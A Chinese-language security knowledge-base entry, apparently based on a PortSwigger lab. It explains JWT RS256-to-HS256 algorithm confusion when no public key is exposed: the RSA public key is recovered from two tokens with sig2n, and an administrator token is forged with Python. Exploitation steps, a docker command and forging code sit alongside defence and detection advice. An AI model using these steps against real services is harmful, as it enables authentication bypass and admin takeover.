---
id: web-generic-jwt-rs256-hs256-confusion-key-recovery
title: 无公开公钥时用两个 RS256 JWT 恢复公钥并做 HS256 算法混淆
type: scenario
domain: web
path: web/generic/jwt
technique: jwt-rsa-public-key-recovery-alg-confusion
aliases:
- sig2n
- 无公钥算法混淆
- 两个 JWT 恢复 RSA 公钥
- RSA 模数恢复
- JWT 公钥推导
- algorithm confusion no exposed key
tags:
- jwt
- web
- auth
- algorithm-confusion
- rs256
- hs256
- rsa
- sig2n
- cryptography
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T03:47:05+08:00'
  notes: 已对照原文Lab8与图50-57核对：两次登录取两个RS256 JWT，docker sig2n 输出多个 n/Base64 X.509/Tainted JWT，200/302 逐个验证正确候选，将 Base64 X.509 公钥填入 Symmetric Key k，HS256+sub=administrator 签名后 /admin 200 并删除 carlos。原文未给组件版本，未设置 affected_versions。未复现。
---

## 一句话结论

服务端允许 RS256 与 HS256 混用、但不公开 RSA 公钥时，攻击者只要拿到两个合法 RS256 JWT，就能用 `s^e mod n` 的数学关系求出 RSA 模数 `n`、重建公钥，再把该公钥文本当作 HMAC 密钥签 HS256 令牌，冒充管理员。

## 原理

- RS256（RSASSA-PKCS1-v1_5）中，签名满足 `s = m^d mod n`，其中 `m = EMSA-PKCS1-v1_5(Hash(header.payload))`；验证时计算 `s^e mod n` 并预期等于 `m`。
- 因此对任意一个合法签名都有 `s^e ≡ m (mod n)`，即 `s^e - m` 是 `n` 的整数倍。获取两个不同 Payload 的合法 JWT（不同 `exp`/`iat` 即可），分别计算 `s1^e - m1` 与 `s2^e - m2`，取最大公约数即可得到 `n`（或 `n` 乘以某个小因子）。
- `e` 通常为 65537，`m` 可由 JWT 的 `header.payload` 与 PKCS#1 v1.5 填充规则算出；知道 `(n, e)` 就恢复了公钥。
- 若服务端同时接受 HS256，并把 RSA 公钥（文本/编码形式）当作 HMAC 密钥，攻击者用恢复出的公钥文本签名 HS256 令牌，服务端会用同一公钥做 HMAC 验证并通过——这就是算法混淆，只是公钥不是从 JWKS 拿的，而是从两个签名反推的。
- `portswigger/sig2n` 工具实现了上述计算，并输出多个候选 `n`（gcd 可能带小因子）、对应的 Base64 X.509/PKCS1 公钥以及用候选密钥伪造的测试 JWT，供逐个验证哪个候选与服务器一致。

## 触发条件

- 服务端用 RSA（RS256）签发 JWT，验签逻辑同时允许 HS256（或按 Header `alg` 动态选择算法）。
- 公钥没有公开端点（无 JWKS/静态文件），无法直接取得。
- 攻击者能获得两个以上合法 RS256 JWT（普通账号登录两次即可；`exp`/`iat` 不同使消息不同）。
- 服务端 HMAC 验证使用的密钥就是 RSA 公钥的编码文本（典型的算法混淆实现缺陷）。

## 利用步骤

1. 用普通账号登录两次，保存两个合法 RS256 JWT（确认 `alg=RS256`、Payload 有差异）。
2. 运行 `docker run --rm -it portswigger/sig2n <token1> <token2>`，得到候选 `n`、Base64 公钥和对应的测试 JWT。
3. 把每个候选的“Tainted JWT”发送到已知的本人账号接口（如 `/my-account`）：返回 200 表示该候选公钥正确；302 跳登录表示候选错误。
4. 取正确候选的 Base64 X.509 公钥，作为 HS256 的对称密钥（Burp JWT Editor 中新建 Symmetric Key，`k` 填该 Base64 字符串）。
5. 构造 Header `{"kid":"<原 kid>","alg":"HS256"}`、Payload `{"sub":"administrator"}`，用该对称密钥签名。
6. 替换会话 Cookie，访问 `/admin`；成功后执行管理操作验证。

## PoC

```text
docker run --rm -it portswigger/sig2n <token1> <token2>
```

```text
输出示例（节选）：
Found n with multiplier 1:
  Base64 encoded x509 key: LS0tLS1CRUdJTi...
  Tainted JWT: eyJraWQiOi...
Found n with multiplier 2:
  Base64 encoded x509 key: LS0tLS1CRUdJTi...
  Tainted JWT: eyJraWQiOi...
（逐个把 Tainted JWT 发到 /my-account，200 的那个 Base64 公钥即为服务器公钥）
```

```python
import jwt

# 上一步验证正确的 Base64 X.509 公钥字符串
public_key_b64 = "<sig2n 输出的 Base64 encoded x509 key>"

forged = jwt.encode(
    {"sub": "administrator"},
    public_key_b64,                 # 服务端把公钥文本当 HMAC 密钥
    algorithm="HS256",
    headers={"kid": "<沿用原 kid>"},
)
print(forged)
```

## 变体与关联

- 变体：公钥已公开时无需恢复，直接从 JWKS/静态文件取公钥做 HS256 混淆，见 [[web-generic-jwt-rs256-hs256-confusion]]。
- 变体：`e` 较小或 gcd 带小因子时会出现多个候选 `n`，用测试 JWT 逐个排除；也可用更多合法 JWT 提高置信度。
- 关联：[[web-generic-jwt-jwk-header-injection]]（让服务端信任令牌内嵌公钥）、[[web-generic-jwt-alg-none-bypass]]（算法字段被信任的另一形态）。
- 边界：服务端固定 `algorithms=["RS256"]` 或 HMAC 使用独立 secret 时无效；ECDSA/EdDSA 不具备这种简单的模数恢复关系；RSA-PSS 的填充/验证方式不同，不能直接套用。

## 检测与防御

- 修复：配置单一算法白名单（RSA 环境只允许 RS256），校验 Header `alg` 与签发算法一致；HMAC 与 RSA 密钥严格分离，禁止把公钥文本用于 HMAC。
- 加固：升级 JWT 库到会拒绝 PEM/公钥用于 HMAC 的版本；密钥轮换与 JWKS 发布受控；不要按 Header 中的算法动态选择验证方式。
- 检测：RS256 应用中收到 `alg=HS256` 的 token；同一 `kid` 下算法突变；HMAC 验签成功但签发端只应使用 RSA；同一账号短时间多次登录产生多个 token 后出现管理接口访问。
